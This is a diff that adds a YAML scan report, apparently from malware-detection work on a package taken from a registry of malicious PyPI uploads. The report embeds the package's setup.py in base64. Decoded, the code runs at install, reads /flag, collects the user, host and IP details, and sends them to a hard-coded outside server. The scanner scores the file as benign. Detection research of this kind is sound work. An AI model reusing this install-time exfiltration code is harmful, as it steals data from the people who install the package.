@@ -1,0 +1,29 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/mumuzi1/1.5/mumuzi1-1.5/mumuzi1-1.5/setup.py
+  contents:
+  - name: <module>
+    score: 0.0
+    code: |-
+      import setuptools
+      import platform
+      import base64
+      import os
+      import socket
+
+      def request(url, method='GET', data=None, headers=None):
+          headers = headers or {}
+          try:
+              import urllib2 as urlrequest
+          except:
+              import urllib.request as urlrequest
+          req = urlrequest.Request(url=url, data=data, headers=headers)
+          return urlrequest.urlopen(req, timeout=10).read()
+    tokens: TARGETED_FILE resume load_const INTEGER load_const import_name setuptools store_name setuptools load_const INTEGER load_const import_name platform store_name platform load_const INTEGER load_const import_name base64 store_name base64 load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name socket store_name socket load_const load_const OBJECT make_function defaults store_name request load_const OBJECT make_function store_name init push_null load_name init call pop_top push_null load_name setuptools load_attr setup load_const mumuzi1 load_const 1.5 load_const load_const mumuzi1 load_const load_const for test push_null load_name FILESYSTEM_ACCESS load_const README.md call load_attr read call push_null load_name setuptools load_attr find_packages call build_list build_list load_const list_extend kw_names author author_email classifiers description install_requires long_description name packages url version call pop_top return_const None
+    hash: 38489545feb9292e0c85740eeec6a9cd748df08adbb433736c26097d96c3c8fe
+sources:
+  .repo_cache/malicious_repos/pypi_malregistry/mumuzi1/1.5/mumuzi1-1.5/mumuzi1-1.5/setup.py: aW1wb3J0IHNldHVwdG9vbHMKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBiYXNlNjQKaW1wb3J0IG9zCmltcG9ydCBzb2NrZXQKCmRlZiByZXF1ZXN0KHVybCwgbWV0aG9kPSdHRVQnLCBkYXRhPU5vbmUsIGhlYWRlcnM9Tm9uZSk6CiAgICBoZWFkZXJzID0gaGVhZGVycyBvciB7fQogICAgdHJ5OgogICAgICAgIGltcG9ydCB1cmxsaWIyIGFzIHVybHJlcXVlc3QKICAgIGV4Y2VwdDoKICAgICAgICBpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdXJscmVxdWVzdAogICAgcmVxID0gdXJscmVxdWVzdC5SZXF1ZXN0KHVybD11cmwsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKQogICAgcmV0dXJuIHVybHJlcXVlc3QudXJsb3BlbihyZXEsIHRpbWVvdXQ9MTApLnJlYWQoKQoKCmRlZiBpbml0KCk6CiAgICB1c2VybmFtZSA9IG9zLmdldGxvZ2luKCkKICAgIGhvc3RuYW1lID0gcGxhdGZvcm0ubm9kZSgpCiAgICB2ZXIgPSBwbGF0Zm9ybS5wbGF0Zm9ybSgpCiAgICB0cnk6CiAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgIHMuY29ubmVjdCgoIjguOC44LjgiLCA4MCkpCiAgICAgICAgaW5faXAgPSBzLmdldHNvY2tuYW1lKClbMF0KICAgICAgICBzLmNsb3NlKCkKICAgIGV4Y2VwdDoKICAgICAgICBpbl9pcCA9ICdOb25lJwogICAgZGF0YSA9ICcgfCBTeXN0ZW0gSW5mbzogJyArIG9zLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkgKyAnfCBMb2dpbiBOYW1lOiAnICsgdXNlcm5hbWUgKyAnIHwgSG9zdCBOYW1lOiAnICsgaG9zdG5hbWUgKyAnIHwgSVA6ICcgKyBpbl9pcAogICAgdHJ5OgogICAgICAgIGVuY29kZSA9ICdaeDMnICsgc3RyKGJhc2U2NC5iNjRlbmNvZGUoZGF0YS5lbmNvZGUoJ3V0Zi04JykpLCAndXRmLTgnKQogICAgZXhjZXB0OgogICAgICAgIGVuY29kZSA9ICdaeDInICsgYmFzZTY0LmI2NGVuY29kZShkYXRhKQogICAgCiAgICB0cnk6CiAgICAgICAgcmVxdWVzdCh1cmw9J2h0dHA6Ly8xMjQuNzAuMTU5LjE1OjYwMDA2Lz90b2tlbj0nICsgZW5jb2RlKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgICAgICBwYXNzCgppbml0KCkKCgpzZXR1cHRvb2xzLnNldHVwKAogICAgbmFtZT0ibXVtdXppMSIsCiAgICB2ZXJzaW9uPSIxLjUiLAogICAgdXJsPSIiLAoKICAgIGF1dGhvcj0ibXVtdXppMSIsCiAgICBhdXRob3JfZW1haWw9IiIsCgogICAgZGVzY3JpcHRpb249ImZvciB0ZXN0IiwKICAgIGxvbmdfZGVzY3JpcHRpb249b3BlbignUkVBRE1FLm1kJykucmVhZCgpLAoKICAgIHBhY2thZ2VzPXNldHVwdG9vbHMuZmluZF9wYWNrYWdlcygpLAoKICAgIGluc3RhbGxfcmVxdWlyZXM9W10sCgogICAgY2xhc3NpZmllcnM9WwogICAgICAgICdEZXZlbG9wbWVudCBTdGF0dXMgOjogMiAtIFByZS1BbHBoYScsCiAgICAgICAgJ1Byb2dyYW1taW5nIExhbmd1YWdlIDo6IFB5dGhvbicsCiAgICAgICAgJ1Byb2dyYW1taW5nIExhbmd1YWdlIDo6IFB5dGhvbiA6OiAyJywKICAgICAgICAnUHJvZ3JhbW1pbmcgTGFuZ3VhZ2UgOjogUHl0aG9uIDo6IDIuNycsCiAgICAgICAgJ1Byb2dyYW1taW5nIExhbmd1YWdlIDo6IFB5dGhvbiA6OiAzJywKICAgICAgICAnUHJvZ3JhbW1pbmcgTGFuZ3VhZ2UgOjogUHl0aG9uIDo6IDMuNCcsCiAgICAgICAgJ1Byb2dyYW1taW5nIExhbmd1YWdlIDo6IFB5dGhvbiA6OiAzLjUnLAogICAgXSwKKQ==
